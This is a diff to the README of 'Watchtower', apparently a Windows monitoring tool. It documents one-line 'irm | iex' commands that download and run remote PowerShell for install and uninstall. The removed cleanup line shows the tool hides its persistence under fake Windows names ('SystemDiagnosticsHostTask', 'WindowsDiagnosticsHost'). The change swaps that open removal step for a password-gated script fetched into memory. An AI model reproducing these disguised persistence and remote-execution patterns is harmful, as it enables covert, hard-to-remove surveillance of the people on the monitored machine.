@@ -120,18 +120,21 @@ irm https://watchtower-production-3b1e.up.railway.app/api/install.ps1 | iex
 
 ---
 
-### 5. 🗑️ 1-Line Client Uninstallation
+### 5. 🗑️ 1-Line Client Uninstallation (Password-Protected)
 
-To completely remove Watchtower from a Windows machine:
+To remove Watchtower from a Windows machine, the parent/admin password is required to unlock the uninstallation payload:
 
 ```powershell
 irm https://watchtower-production-3b1e.up.railway.app/api/uninstall.ps1 | iex
 ```
 
-*Or run the manual PowerShell cleanup command:*
+*Or provide the password directly:*
 ```powershell
-Stop-Process -Name "watchtower" -Force -ErrorAction SilentlyContinue; schtasks.exe /delete /tn "Microsoft\Windows\SystemDiagnosticsHostTask" /f 2>$null; Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue; Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDiagnosticsHost" -ErrorAction SilentlyContinue; Remove-Item -Path "C:\ProgramData\Watchtower" -Recurse -Force -ErrorAction SilentlyContinue; Write-Host "Watchtower has been completely uninstalled." -ForegroundColor Green
+& ([scriptblock]::Create((irm https://watchtower-production-3b1e.up.railway.app/api/uninstall.ps1))) -Password "0000"
 ```
+
+The uninstallation logic is fetched in-memory directly from the secure server endpoint after password verification and is never stored in static uninstaller scripts.
+
 
 ---
 
